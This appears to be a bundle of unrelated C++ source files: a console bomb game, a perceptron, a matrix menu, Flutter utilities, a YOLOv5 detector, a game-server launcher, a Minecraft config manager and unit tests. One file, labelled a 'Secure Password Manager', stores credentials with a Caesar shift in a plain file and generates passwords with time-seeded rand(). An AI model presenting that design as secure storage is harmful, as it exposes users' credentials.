    "#include <iostream>\n#include <windows.h>\n#include <conio.h>\n#include <time.h>\n#include <vector>\n#include <chrono>\n#include <locale.h>\n\nusing namespace std;\nusing namespace std::chrono;\n\n// Estrutura para o display in game\nstruct Display {\n    float tempo;\n    int movimento;\n    int qtdBombas;\n};\n\n// Estrutura para representar os inimigos\nstruct Inimigo\n{\n    int x;\n    int y;\n};\n\n// Estrutura para representar os jogadores\nstruct Jogador\n{\n    short int x;\n    short int y;\n    short int vidas = 1;\n    short int maximoBombas = 1;\n    bool resisteBomba = false;\n    bool raioBomba = 1;\n    bool bombaRelogio = false;\n    bool noclip = false;\n    bool noclipBomba = false;\n};\n\n// Estrutura para representar as bombas\nstruct Bomba\n{\n    bool ativa;\n    short int x;\n    short int y;\n};\n\n\n// Fun\u00e7\u00e3o para verificar se o movimento \u00e9 v\u00e1lido\n\nbool verificaMovimento(int m[][15], int x, int y)\n{\n    if (m[x][y] == 8){\n        return m[x][y];\n    }\n    return m[x][y] == 0;\n}\n\n//bool chancePowerUp ()\n//{\n//    int chance = rand() % 100+1;\n//    if (chance < 100)\n//    {\n//        return true;\n//    }\n//    else {\n//\n//        return false;\n//    }\n//\n//}\n\n//int powerUp()\n//{\n//    chancePowerUp();\n//    if (chancePowerUp)\n//     int tipoPowerUp = 2; //0 para aumento da quantidade de bombas, 1 vida extra, 2 para invencibilidade contra bomba e 3 para atravessar blocos quebraveis\n//        return tipoPowerUp;\n//\n//}\n//bool resisteBomba()\n//{\n//    int tipo = powerUp();\n//    if (tipo == 2){\n//        return resisteBomba;\n//\n//    }\n//    else {\n//        return false;\n//    }\n//}\n\n// Fun\u00e7\u00e3o para mover os inimigos\n\nvoid moverInimigos(int m[][15], vector<Inimigo>& inimigos)\n{\n    for (auto& inimigo : inimigos)\n    {\n        int dir = rand() % 4; // 0 para cima, 1 para baixo, 2 para esquerda, 3 para direita\n        switch (dir)\n        {\n        case 0:\n            if (verificaMovimento(m, inimigo.x - 1, inimigo.y))\n            {\n                inimigo.x--;\n            }\n            break;\n        case 1:\n            if (verificaMovimento(m, inimigo.x + 1, inimigo.y))\n            {\n                inimigo.x++;\n            }\n            break;\n        case 2:\n            if (verificaMovimento(m, inimigo.x, inimigo.y - 1))\n            {\n                inimigo.y--;\n            }\n            break;\n        case 3:\n            if (verificaMovimento(m, inimigo.x, inimigo.y + 1))\n            {\n                inimigo.y++;\n            }\n            break;\n        }\n    }\n\n}\n\n// Fun\u00c3\u00a7\u00c3\u00a3o para definir o estado do jogo\nvoid definirJogo(int m[][15], const vector<Inimigo>& inimigos, const Jogador& jogador, const Bomba& bomba, int& contadorPiscadasBomba, const Display& ingameDisplay)\n{\n    COORD coord;\n    coord.X = 0;\n    coord.Y = 0;\n    SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), coord);\n\n    for (int i = 0; i < 15; i++)\n    {\n        for (int j = 0; j < 15; j++)\n        {\n            if (i == jogador.x && j == jogador.y)\n            {\n                cout << char(36);\n            }\n            else if (bomba.x == i && bomba.y == j && bomba.ativa && contadorPiscadasBomba % 2 == 0)\n            {\n                cout << char(184); // Exibe a bomba se o contador de piscadas for par\n            }\n            else\n            {\n                bool verificaInimigo = false;\n                for (const auto& inimigo : inimigos)\n                {\n                    if (i == inimigo.x && j == inimigo.y)\n                    {\n                        cout << char(159);\n                        verificaInimigo = true;\n                        break;\n                    }\n                }\n                if (!verificaInimigo)\n\n                {\n                    switch (m[i][j])\n                    {\n                    case 0:\n                        cout << \" \";\n                        break;\n                    case 1:\n                        cout << char(219);\n                        break;\n                    case 2:\n                        cout << char(35);\n                        break; // Paredes quebr\u00c3\u00a1veis\n                    case 3:\n                        cout << char(157);\n                        break; // bomba\n                    case 4:\n                        cout << char(159);\n                        break; // Inimigo\n                    case 5:\n                        cout << char(36);\n                        break; // Jogador\n                    case 7:\n                        cout << char(134);\n\n                        break; // explos\u00e3o\n                    case 8:\n                        cout << char(5);\n                        break; //powerup\n                    case 9:\n                        cout << char(75);\n                        break;\n                    case 10:\n                        cout << char(75);\n                        break;\n                    case 11:\n                        cout << char(75);\n                        break;\n                    case 12:\n                        cout << char(75);\n    ",
    "#include <fstream>\n#include <string>\n#include <vector>\n#include \"perceptron.h\"\nusing namespace std;\n\nPerceptron::Perceptron(const string& weightsFile, double lr) : learningRate(lr), bias(0.0) {\n    ifstream inWeights(weightsFile);\n    double weight;\n    while (inWeights >> weight) {\n        weights.push_back(weight);\n    }\n    inWeights.close();\n}\n\nvoid Perceptron::weightsToFile(const string& weightsFile) {\n    ofstream outWeights(weightsFile);\n    if (outWeights.is_open()) {\n        for (double weight : weights) { // weight = weights[i]\n            outWeights << weight << \" \";\n        }\n        outWeights.close();\n    } else {\n        cout << \"unable to open weights file\\n\";\n    }\n}\n\nvoid Perceptron::biasToFile(const string& biasFile) {\n    ofstream outBias(biasFile);\n    if (outBias.is_open()) {\n        outBias << bias;\n        outBias.close();\n    } else {\n        cout << \"unable to open bias file\\n\";\n    }\n}\n\nint Perceptron::feedForward(const vector<int>& inputs) {\n    double sum = bias;\n    for (int i = 0; i < weights.size(); i++) {\n        sum += inputs[i]*weights[i];\n    }\n    \n    if (sum >= 0) {\n        return 1;\n    } else {\n        return -1;\n    }\n}\n\nvoid Perceptron::train(const vector<int>& inputs, int label) {\n    int prediction = feedForward(inputs);\n    int error = label - prediction;\n\n    bias += learningRate * error;\n    for (int i = 0; i < weights.size(); i++) {\n        weights[i] += learningRate * error * inputs[i];\n    }\n\n    weightsToFile(\"weights.txt\");\n    biasToFile(\"bias.txt\");\n}",
    "#include <iostream>\n\n\nusing namespace std;\n\n// costanti che definiscono il numero massimo di righe e colonne\nconst int righeMax=30;\nconst int colonneMax=30;\n\n//prototipi\nvoid caricaMatrice(int matrix[righeMax][colonneMax], int &righe, int &colonne);\nvoid visualizzaMatrice(int matrix[righeMax][colonneMax], int righe, int colonne);\nint Menu();\n\nint main() {\n\n  int scelta;\n  int righe, colonne;\n  int matrix[righeMax][colonneMax];\n  do {\n    scelta=Menu();\n    switch(scelta) {\n      case 1:\n        caricaMatrice(matrix,righe,colonne);\n      break;\n      case 2:\n        visualizzaMatrice(matrix,righe,colonne);\n      break;\n      case 0:\n        cout<<\"Esci\"<<endl;\n      break;\n      default:\n        cout<<\"Attenzione, scelta sbagliata!\"<<endl;\n      break;\n    }\n  }while(scelta!=0);\n  \n}\n\n\nint Menu() {\n  int scegli;\n  cout<<\"-----------------MENU-----------------\"<<endl;\n  cout<<\"1-Carica matrice\"<<endl;\n  cout<<\"2-Visualizza matrice\"<<endl;\n  cout<<\"0-Fine\"<<endl;\n  cout<<\"Scegli un operazione: \"<<endl;\n  cin>>scegli;\n\n  return scegli;\n}\n\n\nvoid caricaMatrice(int matrix[righeMax][colonneMax], int &righe, int &colonne) {\n\n  cout<<endl;\n\n  do{\n    cout<<\"Inserisci il numero di righe: \";\n    cin>>righe;\n    if(righe<=0||righe>righeMax) {\n      cout<<\"Errore\"<<endl;\n    }\n  }while(righe<=0||righe>righeMax);\n\n  do{\n    cout<<\"Inserisci il numero di colonne: \";\n    cin>>colonne;\n    if(colonne<=0||colonne>colonneMax) {\n      cout<<\"Errore\"<<endl;\n    }\n  }while(colonne<=0||colonne>colonneMax);\n\n  for(int i=0; i<righe; i++) {\n    for(int j=0; j<colonne; j++) {\n      cout<<\"Inserisci il valore della cella \"<<i+1<<\" \"<<j+1<<\": \";\n      cin>>matrix[i][j];\n    }\n  }\n\n\n  cout<<endl;\n  \n}\n\nvoid visualizzaMatrice(int matrix[righeMax][colonneMax], int righe, int colonne) {\n\n  cout<<endl;\n  \n  for(int i=0; i<righe; i++) {\n    for(int j=0; j<colonne; j++) {\n      cout<<matrix[i][j]<<\"\\t\";\n    }\n    cout<<endl;\n  }\n\n  cout<<endl;\n  \n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <fstream>\n#include <opencv2/opencv.hpp>\n#include \"utils.h\"\n\nusing namespace std;\n\nvoid predictOnVideo(const auto webcamId, const bool isCuda = false)\n{\n    Yolov5Detector detector(\"../assets/models/yolov5s.onnx\", \"../assets/classes.txt\", isCuda);\n    Yolov5Detector::DetectionData output;\n\n    cv::VideoCapture cap(webcamId);\n    cv::Mat frame, resultImg;\n\n    cap.set(3, 640);\n    cap.set(4, 480);\n\n    while (true)\n    {\n        cap.read(frame);\n        output = detector.detect(frame, true);\n        resultImg = output.image;\n        cv::imshow(\"Webcam \" + webcamId, resultImg);\n\n        if ((cv::waitKey(1) & 0xFF) == 27)\n        {\n            break;\n        }\n    }\n}\n\nvoid predictOnImage(string imagePath, bool isCuda = false)\n{\n    Yolov5Detector detector(\"../assets/models/yolov5s.onnx\", \"../assets/classes.txt\", isCuda);\n\n    cv::Mat image = cv::imread(imagePath);\n    if (image.empty())\n    {\n        cerr << \"Error loading image\\n\";\n    }\n\n    Yolov5Detector::DetectionData output;\n    output = detector.detect(image, true);\n\n    cv::Mat resultImg = output.image;\n    vector<Yolov5Detector::Detection> detections = output.detections;\n\n    cv::imshow(\"result image\", resultImg);\n    cv::waitKey(0);\n}\n\nint findType(const string &path)\n{\n    vector<string> image_extensions = {\".jpg\", \".jpeg\", \".png\"};\n    for (const string &ext : image_extensions)\n    {\n        string lower_path = path;\n        transform(lower_path.begin(), lower_path.end(), lower_path.begin(), ::tolower);\n        if (lower_path.size() >= ext.size() && lower_path.substr(lower_path.size() - ext.size()) == ext)\n        {\n            return 0;\n        }\n    }\n\n    vector<string> video_extensions = {\".mp4\", \".avi\"};\n    for (const string &ext : video_extensions)\n    {\n        if (path.size() >= ext.size() && path.substr(path.size() - ext.size()) == ext)\n        {\n            return 1;\n        }\n    }\n\n    try\n    {\n        stod(path);\n        return 2;\n    }\n    catch (const invalid_argument &)\n    {\n        // Not a number, continue\n    }\n    catch (const out_of_range &)\n    {\n        // Not a number, continue\n    }\n\n    return -1;\n}\n\nint main(int argc, const char *argv[])\n{\n    bool isCuda = argc > 1 && strcmp(argv[1], \"cuda\") == 0;\n\n    string input = argv[1];\n    int type = findType(input);\n    if (type == -1)\n    {\n        cout << \"Please specify a valid type\" << endl;\n        return -1;\n    }\n    else if (type == 0)\n    {\n        predictOnImage(input, isCuda);\n    }\n    else if (type == 1)\n    {\n        predictOnVideo(input, isCuda);\n    }\n    else if (type == 2)\n    {\n        predictOnVideo(stoi(input), isCuda);\n    }\n}",
    "#include <iostream>\r\n#include <fstream>\r\n#include <string>\r\n#include <vector>\r\n#include <cstdlib>\r\n#include <ctime>\r\n#include <algorithm>\r\n#include <cctype>\r\n#include <map>\r\n#include <sstream>\r\n#include <limits> \r\n#include <stdexcept> \r\n\r\nstd::string generateRandomPassword(int length) {\r\n    const std::string charset = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+\";\r\n    std::string password;\r\n    std::srand(static_cast<unsigned int>(std::time(nullptr)));\r\n    for (int i = 0; i < length; ++i) {\r\n        password += charset[std::rand() % charset.size()];\r\n    }\r\n    return password;\r\n}\r\n\r\nstd::string encrypt(const std::string& text, int key) {\r\n    std::string result = text;\r\n    for (char& c : result) {\r\n        if (std::isalpha(c)) {\r\n            char base = std::isupper(c) ? 'A' : 'a';\r\n            c = (c - base + key) % 26 + base;\r\n        }\r\n    }\r\n    return result;\r\n}\r\n\r\nstd::string decrypt(const std::string& text, int key) {\r\n    return encrypt(text, 26 - key);\r\n}\r\n\r\nvoid storePassword(const std::string& site, const std::string& username, const std::string& password) {\r\n    std::ofstream file(\"C:\\\\mang.txt\", std::ios::app);\r\n    if (file.is_open()) {\r\n        std::string encryptedSite = encrypt(site, 3);\r\n        std::string encryptedUsername = encrypt(username, 3);\r\n        std::string encryptedPassword = encrypt(password, 3);\r\n        file << encryptedSite << \" \" << encryptedUsername << \" \" << encryptedPassword << std::endl;\r\n        std::cout << \"Password stored successfully.\" << std::endl;\r\n    }\r\n    else {\r\n        std::cerr << \"Error: Unable to open file for storing password.\" << std::endl;\r\n        system(\"cls\");\r\n    }\r\n}\r\n\r\nstd::map<std::string, std::pair<std::string, std::string>> retrievePasswords() {\r\n    std::ifstream file(\"C:\\\\mang.txt\");\r\n    std::map<std::string, std::pair<std::string, std::string>> passwords;\r\n    if (file.is_open()) {\r\n        std::string line;\r\n        while (std::getline(file, line)) {\r\n            std::istringstream iss(line);\r\n            std::string encryptedSite, encryptedUsername, encryptedPassword;\r\n            if (iss >> encryptedSite >> encryptedUsername >> encryptedPassword) {\r\n                std::string site = decrypt(encryptedSite, 3);\r\n                std::string username = decrypt(encryptedUsername, 3);\r\n                std::string password = decrypt(encryptedPassword, 3);\r\n                passwords[site] = std::make_pair(username, password);\r\n            }\r\n        }\r\n    }\r\n    else {\r\n        std::cerr << \"Error: Unable to open password file for retrieval.\" << std::endl;\r\n    }\r\n    return passwords;\r\n}\r\n\r\nvoid clearScreen() {\r\n#ifdef _WIN32\r\n    system(\"cls\");\r\n#else\r\n    system(\"clear\");\r\n#endif\r\n}\r\n\r\nint main() {\r\n    int choice;\r\n    std::map<std::string, std::pair<std::string, std::string>> passwords;\r\n    do {\r\n        clearScreen();\r\n        passwords = retrievePasswords();\r\n        std::cout << \"\\nSecure Password Manager\\n\";\r\n        std::cout << \"1. Store New Password\\n\";\r\n        std::cout << \"2. Retrieve Password\\n\";\r\n        std::cout << \"3. Generate Random Password\\n\";\r\n        std::cout << \"4. Exit\\n\";\r\n        std::cout << \"Enter your choice: \";\r\n        std::cin >> choice;\r\n        std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\\n');\r\n\r\n        switch (choice) {\r\n        case 1: {\r\n            std::string site, username, password;\r\n            std::cout << \"Enter website or service name: \";\r\n            std::getline(std::cin, site);\r\n            std::cout << \"Enter username: \";\r\n            std::getline(std::cin, username);\r\n            std::cout << \"Enter password: \";\r\n            std::getline(std::cin, password);\r\n            storePassword(site, username, password);\r\n            std::cout << \"\\nPress Enter to continue...\";\r\n            std::cin.get();\r\n            break;\r\n        }\r\n        case 2: {\r\n            std::string site;\r\n            std::cout << \"Enter website or service name: \";\r\n            std::getline(std::cin, site);\r\n            auto it = passwords.find(site);\r\n            if (it != passwords.end()) {\r\n                std::cout << \"Username: \" << it->second.first << std::endl;\r\n                std::cout << \"Password: \" << it->second.second << std::endl;\r\n            }\r\n            else {\r\n                std::cout << \"Password not found for the given site.\" << std::endl;\r\n            }\r\n            std::cout << \"\\nPress Enter to continue...\";\r\n            std::cin.get();\r\n            break;\r\n        }\r\n        case 3: {\r\n            int length;\r\n            std::cout << \"Enter password length: \";\r\n            std::cin >> length;\r\n            std::cout << \"Generated Password: \" << generateRandomPassword(length) << std::endl;\r\n            std::cout << \"\\nPress Enter to continue...\";\r\n            std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\\n');\r\n            std::cin.get();\r\n            break;\r\n        }\r\n        case 4:\r\n            std::cout << \"Exi",
    "#include \"../include/container_view.h\"\n#include <iostream>\n#include <vector>\n#include <deque>\n#include <list>\n#include <set>\n#include <map>\n#include <unordered_set>\n#include <unordered_map>\n#include <array>\n#include <tuple>\n#include <forward_list>\n\nint main() {\n    // Pair\n    std::pair<int, double> p = {1, 3.14};\n    std::cout << \"Pair: \" << p << std::endl;\n\n    // Tuple\n    std::tuple<int, char, double> t = {1, 'a', 2.3};\n    std::cout << \"Tuple: \" << t << std::endl;\n\n    // Array\n    std::array<int, 3> arr = {1, 2, 3};\n    std::cout << \"Array: \" << arr << std::endl;\n\n    // Deque\n    std::deque<double> dq = {1.1, 2.2, 3.3};\n    std::cout << \"Deque: \" << dq << std::endl;\n\n    // Forward List\n    std::forward_list<int> fl = {1, 2, 3};\n    std::cout << \"Forward List: \" << fl << std::endl;\n\n    // Initializer list (note: we cannot print directly, used only for example)\n    std::initializer_list<int> il = {1, 2, 3};\n\n    // List\n    std::list<int> lst = {1, 2, 3};\n    std::cout << \"List: \" << lst << std::endl;\n\n    // Vector\n    std::vector<std::string> vec = {\"hello\", \"world\"};\n    std::cout << \"Vector: \" << vec << std::endl;\n\n    // Set\n    std::set<std::string> set = {\"apple\", \"banana\", \"cherry\"};\n    std::cout << \"Set: \" << set << std::endl;\n\n    // Multiset\n    std::multiset<int> mset = {4, 5, 4, 1};\n    std::cout << \"Multiset: \" << mset << std::endl;\n\n    // Unordered Set\n    std::unordered_set<int> uset = {4, 5, 6, 7};\n    std::cout << \"Unordered Set: \" << uset << std::endl;\n\n    // Unordered Multiset\n    std::unordered_multiset<int> umset = {4, 5, 6, 6};\n    std::cout << \"Unordered Multiset: \" << umset << std::endl;\n\n    // Map\n    std::map<char, int> map = {{'a', 1}, {'b', 2}};\n    std::cout << \"Map: \" << map << std::endl;\n\n    // Multimap\n    std::multimap<char, int> mmap = {{'a', 1}, {'a', 2}};\n    std::cout << \"Multimap: \" << mmap << std::endl;\n\n    // Unordered Map\n    std::unordered_map<char, int> umap = {{'c', 3}, {'b', 2}};\n    std::cout << \"Unordered Map: \" << umap << std::endl;\n\n    // Unordered Multimap\n    std::unordered_multimap<char, int> ummap = {{'c', 3}, {'c', 4}};\n    std::cout << \"Unordered Multimap: \" << ummap << std::endl;\n\n    return 0;\n}\n",
    "#define WIN32_LEAN_AND_MEAN\n#include <Windows.h>\n#include <cstdlib>\n#include <cstring>\n#include <cstdio>\n#include \"patches.h\"\n\nstatic constexpr unsigned char s_AllocConsoleShortCircuit[] =\n{\n    0x33, 0xc0, // XOR EAX, EAX\n    0x40,       // INC EAX\n    0xc3,       // RET\n};\n\nchar msg[] = \"We do not support vgui SRCDS and you shouldn't want that anyway if you're doing stuff properly.\\nPlease launch with -console\";\n\nint main(int argc, char* argv[])\n{\n    // get back to where we would be if we were WinMain:\n    HINSTANCE hInstance = GetModuleHandleA(NULL);\n    HINSTANCE hPrevInstance = 0;\n    LPSTR pCmdLine = GetCommandLineA();\n    INT nCmdShow = 0;\n\n    // dedicated.dll calls AllocConsole - we need to short-circuit it as we already have a console.\n    DWORD dwOldProtect = 0;\n    VirtualProtect((void*)&AllocConsole, sizeof(s_AllocConsoleShortCircuit), PAGE_EXECUTE_READWRITE, &dwOldProtect);\n    memmove((void*)&AllocConsole, s_AllocConsoleShortCircuit, sizeof(s_AllocConsoleShortCircuit));\n    VirtualProtect((void*)&AllocConsole, sizeof(s_AllocConsoleShortCircuit), dwOldProtect, &dwOldProtect);\n    FlushInstructionCache(GetCurrentProcess(), &AllocConsole, sizeof(s_AllocConsoleShortCircuit));\n\n    // and now back to our regularly scheduled srcds.exe\n    char* pszOriginalPath = NULL;\n    size_t nOriginalPathLength = 0;\n    _dupenv_s(&pszOriginalPath, &nOriginalPathLength, \"PATH\");\n\n    char szModuleFileName[MAX_PATH];\n    if (!GetModuleFileNameA(hInstance, szModuleFileName, sizeof(szModuleFileName)))\n    {\n        MessageBoxA(NULL, \"Failed calling GetModuleFileName\", \"Launcher Error\", 0);\n        return 0;\n    }\n\n    if (!strstr(GetCommandLine(), \"-console\")) {\n        MessageBox(NULL, msg, \"Bad Boy.\", 0);\n        ExitProcess(1);\n    }\n\n    char* pLastSlash = strrchr(szModuleFileName, '\\\\');\n\n    char szWorkingDirectory[MAX_PATH];\n    strncpy_s(szWorkingDirectory, szModuleFileName, pLastSlash - szModuleFileName);\n\n    char szPath[0x8000];\n    sprintf_s(szPath, \"%s\\\\bin\\\\;%s\", szWorkingDirectory, pszOriginalPath);\n    free(pszOriginalPath);\n    SetEnvironmentVariableA(\"PATH\", szPath);\n    PatchesInit();\n    sprintf_s(szPath, \"%s\\\\bin\\\\dedicated.dll\", szWorkingDirectory);\n\n    HMODULE hModule = LoadLibraryExA(szPath, NULL, LOAD_WITH_ALTERED_SEARCH_PATH);\n    if (!hModule)\n    {\n        char* pszErrorMessage = NULL;\n        FormatMessageA(\n            FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_IGNORE_INSERTS | FORMAT_MESSAGE_FROM_SYSTEM,\n            NULL,\n            GetLastError(),\n            LANG_NEUTRAL,\n            (LPSTR)&pszErrorMessage,\n            0,\n            NULL\n        );\n        char szError[0x400];\n        sprintf_s(szError, \"Failed to load the launcher DLL:\\n\\n%s\", pszErrorMessage);\n        MessageBoxA(NULL, szError, \"Launcher Error\", 0);\n        LocalFree(pszErrorMessage);\n        return 0;\n    }\n\n    typedef int (*MainFunc)(_In_ HINSTANCE, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR pCmdLine, _In_ int nCmdShow);\n    MainFunc pDedicatedMain = (MainFunc)GetProcAddress(hModule, \"DedicatedMain\");\n    return (*pDedicatedMain)(hInstance, hPrevInstance, pCmdLine, nCmdShow);\n}\n",
    "#include \"plugin/config/ConfigManager.h\"\n#include \"plugin/Family.h\"\n#include \"plugin/Minecraft.h\"\n#include <filesystem>\n#include <fstream>\n\nnamespace Minecraft\n{\nusing json = nlohmann::json;\n\nConfigManager::ConfigManager(std::string pOverallConfigFilePath)\n    : mOverallConfigFilePath(pOverallConfigFilePath)\n{\n}\n\nbool ConfigManager::load()\n{\n    if (!std::filesystem::exists(PLUGIN_WORK_DIR + mOverallConfigFilePath))\n    {\n        MinecraftPlugin::getInstance().getSelf().getLogger().warn(\n            \"Unable to find configuration file: {}, ready to create this configuration!\",\n            mOverallConfigFilePath\n        );\n        if (!createOverallConfigFile())\n        {\n            MinecraftPlugin::getInstance().getSelf().getLogger().error(\n                \"Failed to create configuration file: {}\",\n                PLUGIN_WORK_DIR + mOverallConfigFilePath\n            );\n            return false;\n        }\n        MinecraftPlugin::getInstance().getSelf().getLogger().info(\n            \"Successfully created configuration file: {}\",\n            mOverallConfigFilePath\n        );\n    }\n    else\n    {\n        std::fstream   overallConfigFile(PLUGIN_WORK_DIR + mOverallConfigFilePath);\n        nlohmann::json overallConfigFileData;\n        overallConfigFile >> overallConfigFileData;\n        mOverallConfig = overallConfigFileData.get<OverallConfig>();\n        overallConfigFile.close();\n    }\n    if (!std::filesystem::exists(PLUGIN_WORK_DIR + mOverallConfig.mPath.mFeaturesConfig))\n    {\n        MinecraftPlugin::getInstance().getSelf().getLogger().warn(\n            \"Unable to find configuration file: {}, ready to create this configuration!\",\n            mOverallConfig.mPath.mFeaturesConfig\n        );\n        if (!createFeaturesConfigFile())\n        {\n            MinecraftPlugin::getInstance().getSelf().getLogger().error(\n                \"Failed to create configuration file: {}\",\n                mOverallConfig.mPath.mFeaturesConfig\n            );\n            return false;\n        }\n        MinecraftPlugin::getInstance().getSelf().getLogger().info(\n            \"Successfully created configuration file: {}\",\n            mOverallConfig.mPath.mFeaturesConfig\n        );\n    }\n    else\n    {\n        std::fstream   featuresConfigFile(PLUGIN_WORK_DIR + mOverallConfig.mPath.mFeaturesConfig);\n        nlohmann::json featuresConfigConfigFileData;\n        featuresConfigFile >> featuresConfigConfigFileData;\n        mFeaturesConfig = featuresConfigConfigFileData.get<FeaturesConfig>();\n        featuresConfigFile.close();\n    }\n    return true;\n}\n\nbool ConfigManager::save()\n{\n    std::fstream overallConfigFile(PLUGIN_WORK_DIR + mOverallConfigFilePath, std::ios::out | std::ios::trunc);\n    nlohmann::json overallConfigFileData = mOverallConfig;\n    overallConfigFile << overallConfigFileData.dump(4);\n\n    std::fstream featuresConfigFile(\n        PLUGIN_WORK_DIR + mOverallConfig.mPath.mFeaturesConfig,\n        std::ios::out | std::ios::trunc\n    );\n    nlohmann::json featuresConfigConfigFileData = mFeaturesConfig;\n    featuresConfigFile << featuresConfigConfigFileData.dump(4);\n    return true;\n}\n\nbool ConfigManager::createOverallConfigFile()\n{\n    std::filesystem::path currentDir = std::filesystem::current_path();\n    std::filesystem::path filePath   = currentDir / (PLUGIN_WORK_DIR + mOverallConfigFilePath);\n    std::filesystem::path parentPath = filePath.parent_path();\n    std::filesystem::create_directories(parentPath);\n\n    std::ofstream file(filePath);\n    if (!file.is_open()) { return false; }\n    file << nlohmann::json(mOverallConfig).dump(4);\n    file.close();\n    return true;\n}\n\nbool ConfigManager::createFeaturesConfigFile()\n{\n    std::filesystem::path currentDir = std::filesystem::current_path();\n    std::filesystem::path filePath   = currentDir / (PLUGIN_WORK_DIR + mOverallConfig.mPath.mFeaturesConfig);\n    std::filesystem::path parentPath = filePath.parent_path();\n    std::filesystem::create_directories(parentPath);\n\n    std::ofstream file(filePath);\n    if (!file.is_open()) { return false; }\n    file << nlohmann::json(mFeaturesConfig).dump(4);\n    file.close();\n    return true;\n}\n\nConfigManager::~ConfigManager() {}\n\nConfigManager& ConfigManager::instance()\n{\n    static ConfigManager configManagerInstance(PLUGIN_OVERALL_CONFIG_FILE);\n    return configManagerInstance;\n}\n\n} // namespace Minecraft\n\nnamespace nlohmann\n{\n\nstatic void to_json(json& pJson, const OverallConfig::Path& pOverallConfigPath)\n{\n    pJson[\"overall_config\"]  = pOverallConfigPath.mOverallConfig;\n    pJson[\"features_config\"] = pOverallConfigPath.mFeaturesConfig;\n}\nstatic void from_json(const json& pJson, OverallConfig::Path& pOverallConfigPath)\n{\n    pOverallConfigPath.mOverallConfig  = pJson[\"overall_config\"].get<std::string>();\n    pOverallConfigPath.mFeaturesConfig = pJson[\"features_config\"].get<std::string>();\n}\n\nstatic void to_json(json& pJson, const OverallConfig& pOverallConfig)\n{\n    pJson[\"format_version\"] = pOverallConfig.mFormatVersion;\n    pJson[\"enable\"] ",
    "#include \"matrix.h\"\n\n#include <gtest/gtest.h>\n\nnamespace mca {\nnamespace test {\nTEST(TestShape, defaultConstructor) {\n    Shape s;\n    ASSERT_EQ(s.rows, 0);\n    ASSERT_EQ(s.columns, 0);\n}\n\nTEST(TestShape, equal) {\n    Shape s1{4, 5};\n    Shape s2{4, 5};\n    ASSERT_EQ(s1, s2);\n}\n\nTEST(TestShape, notEqual) {\n    Shape s1{4, 5};\n    Shape s2{4, 4};\n    ASSERT_NE(s1, s2);\n}\n\nTEST(TestShape, size) {\n    Shape s{3, 2};\n    ASSERT_EQ(s.size(), 3 * 2);\n}\n\n// test all constructors\nTEST(TestMatrix, constructors) {\n    Matrix<int> m;\n    ASSERT_EQ(m.getShape(), Shape(0, 0));\n    ASSERT_EQ(m.dataPtr(), nullptr);\n    Matrix<int> m1(Shape{3, 3}, -1);\n    ASSERT_EQ(m1.getShape(), Shape(3, 3));\n    ASSERT_NE(m1.dataPtr(), nullptr);\n    for (size_t i = 0; i < m.getShape().rows; i++) {\n        for (size_t j = 0; j < m.getShape().columns; j++) { ASSERT_EQ(m.get(i, j), -1); }\n    }\n    Matrix<int> m2 = Matrix<int>({{-1, -1, -1}, {-1, -1, -1}});\n    ASSERT_EQ(m2.getShape(), Shape(2, 3));\n    ASSERT_NE(m2.dataPtr(), nullptr);\n    for (size_t i = 0; i < m2.getShape().rows; i++) {\n        for (size_t j = 0; j < m2.getShape().columns; j++) { ASSERT_EQ(m2.get(i, j), -1); }\n    }\n}\n\nTEST(TestMatrix, assignments) {\n    Matrix<int> m;\n    ASSERT_EQ(m.getShape(), Shape(0, 0));\n    ASSERT_EQ(m.dataPtr(), nullptr);\n    m = Matrix<int>({3, 3}, 1);\n    ASSERT_EQ(m.getShape(), Shape(3, 3));\n    ASSERT_NE(m.dataPtr(), nullptr);\n    for (size_t i = 0; i < m.rows(); i++) {\n        for (size_t j = 0; j < m.columns(); j++) { ASSERT_EQ(m.get(i, j), 1); }\n    }\n}\n\n// test get() and getShape()\nTEST(TestMatrix, geter) {\n    Matrix<int> m({{1, 2, 3}, {4, 5, 6}, {7, 8, 9}});\n    ASSERT_EQ(m.getShape(), Shape(3, 3));\n    for (size_t i = 0; i < m.getShape().rows; i++) {\n        for (size_t j = 0; j < m.getShape().columns; j++) {\n            ASSERT_EQ(m.get(i, j), i * 3 + j + 1);\n            m.get(i, j) = 0;\n            ASSERT_EQ(m.get(i, j), 0);\n        }\n    }\n}\n\nTEST(TestMatrix, reshape) {\n    Matrix<int> m({{1, 2, 3, 4, 5, 